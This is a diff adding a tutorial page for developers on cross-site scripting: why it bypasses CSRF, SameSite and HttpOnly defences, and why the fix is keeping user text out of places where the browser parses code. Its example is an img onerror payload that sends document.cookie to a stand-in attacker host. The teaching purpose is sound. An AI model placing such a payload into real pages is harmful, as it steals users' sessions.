@@ -1,0 +1,37 @@
+---
+id: their-code-runs-as-your-page
+title: XSS means their code runs as your page
+---
+
+Cross-site scripting (XSS) is one bug with one shape: **text an attacker controls ends up being
+parsed as code** in your page. The classic carrier is a comment, a display name or a search term
+that your code turns into HTML.
+
+```js
+// A comment from the database, written by an attacker:
+const body = `<img src="x" onerror="fetch('https://evil.example/?c=' + document.cookie)">`;
+
+commentEl.innerHTML = body; // parsed as HTML: the broken image fires onerror
+```
+
+The image fails to load, `onerror` runs, and the attacker's JavaScript is now executing **inside
+your origin, in the victim's browser, with the victim's session**. MDN's XSS page puts it plainly:
+the injected code "can do anything that the site's own code can do". That means it can:
+
+- call your API with `fetch('/api/...')` — the browser attaches the user's cookies, because the
+  request *is* same-origin;
+- read whatever the page can read: the DOM, `localStorage`, a CSRF token in a hidden field;
+- rewrite the page — a fake "session expired, log in again" form that posts the password elsewhere.
+
+That is why XSS sits above the other web defences rather than beside them. CSRF tokens,
+`SameSite` cookies and CORS all assume the attacker is on **another** site. With XSS they are on
+yours. An `HttpOnly` cookie stops the script *reading* the session cookie, but the script doesn't
+need to read it — every request it makes carries the cookie anyway.
+
+The fix is never "detect the evil string". It is: **never let user text reach a place where the
+browser parses it as code** — and the rest of this unit is about where those places are.
+
+<!--more-->
+
+The name is historical: early attacks loaded a script *across sites*. Today most XSS never
+crosses a site at all — the payload is stored in, or reflected by, the very site it attacks.
